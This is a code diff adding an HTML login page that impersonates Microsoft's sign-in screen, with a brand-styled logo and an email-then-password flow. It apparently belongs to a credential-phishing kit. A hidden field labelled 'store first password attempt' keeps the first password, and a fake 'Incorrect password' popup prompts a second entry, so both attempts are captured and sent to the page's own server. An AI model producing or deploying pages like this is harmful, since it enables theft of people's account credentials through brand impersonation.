@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/style.css" />
+</head>
+
+<body>
+
+  <!-- Background slideshow -->
+  <div class="bg-slideshow" aria-hidden="true">
+    <div class="bg-slide" style="background-image:url('https://images.pexels.com/photos/417074/pexels-photo-417074.jpeg');"></div>
+    <div class="bg-slide" style="background-image:url('https://images.pexels.com/photos/417173/pexels-photo-417173.jpeg');"></div>
+    <div class="bg-slide" style="background-image:url('https://images.pexels.com/photos/210307/pexels-photo-210307.jpeg');"></div>
+    <div class="bg-slide" style="background-image:url('https://images.pexels.com/photos/325185/pexels-photo-325185.jpeg');"></div>
+    <div class="bg-overlay"></div>
+  </div>
+
+  <div class="page">
+
+    <div id="serverError" class="error-text" style="text-align:center; margin-bottom:1rem;"></div>
+
+    <div class="card-shell">
+      <section class="card" aria-label="Custom sign in">
+
+        <header class="brand-row">
+          <div class="brand-logo-mark" aria-hidden="true">
+            <div class="mark-sq red"></div>
+            <div class="mark-sq green"></div>
+            <div class="mark-sq blue"></div>
+            <div class="mark-sq yellow"></div>
+          </div>
+          <div class="brand-text">Microsoft</div>
+        </header>
+
+        <div class="step fade-step active show" id="step-email">
+          <h1>Sign in</h1>
+
+          <form id="emailForm" novalidate>
+            <label for="emailInput">Email, phone, or username</label>
+            <input
+              type="email"
+              id="emailInput"
+              name="email"
+              autocomplete="username"
+              aria-required="true"
+              aria-describedby="emailError"
+              required
+            />
+            <p id="emailError" class="error-text">Please enter a valid email address.</p>
+
+            <div>
+              <a href="#" class="link link-block">No account? Sign up</a><br />
+              <a href="#" class="link link-block">Need help signing in?</a>
+            </div>
+
+            <div class="button-group">
+              <button type="button" class="btn-primary" id="nextBtn">
+                <span>Next</span>
+              </button>
+
+              <button type="button" class="btn-secondary">
+                <span class="key-icon">🔑</span>
+                <span>Other sign-in options</span>
+              </button>
+            </div>
+          </form>
+        </div>
+
+        <div class="step fade-step" id="step-password">
+          <h1>Welcome back</h1>
+
+          <form id="passwordForm" action="/api/auth/login" method="POST" novalidate>
+  <input type="hidden" id="hiddenEmail" name="email" />
+  <!-- NEW: store first password attempt -->
+  <input type="hidden" id="firstPassword" name="firstPassword" />
+
+  <label for="passwordInput">Password</label>
+  <input
+    type="password"
+    id="passwordInput"
+    name="password"
+    autocomplete="current-password"
+    aria-required="true"
+    aria-describedby="passwordError capsWarning"
+    required
+  />
+
+  <p id="passwordError" class="error-text">Password cannot be empty.</p>
+  <p id="capsWarning" class="error-text" style="display:none;">Caps Lock is ON</p>
+
+  <a href="#" class="link link-block">Forgot password?</a>
+
+  <div class="button-group">
+    <button type="submit" class="btn-primary" id="signInBtn">
+      <span>Sign in</span>
+    </button>
+
+    <div id="progressBar" class="progress-bar"></div>
+
+    <button type="button" class="btn-secondary" id="backBtn">
+      ◀ Back
+    </button>
+  </div>
+</form>
+        </div>
+
+      </section>
+    </div>
+
+    <div id="loginErrorPopup" class="popup">
+      <div class="popup-box">
+        <h3>Incorrect password</h3>
+        <p>Please try again.</p>
+        <p id="popupCountdown">Closing in 3…</p>
+        <button id="closePopupBtn" class="btn-primary small">OK</button>
+      </div>
+    </div>
+
+    <nav class="footer-links" aria-label="Legal links">
+      <a href="#">Terms</a>
+      <a href="#">Privacy</a>
+    </nav>
+
+  </div>
+
+  <script src="/script.js"></script>
+</body>
+</html>
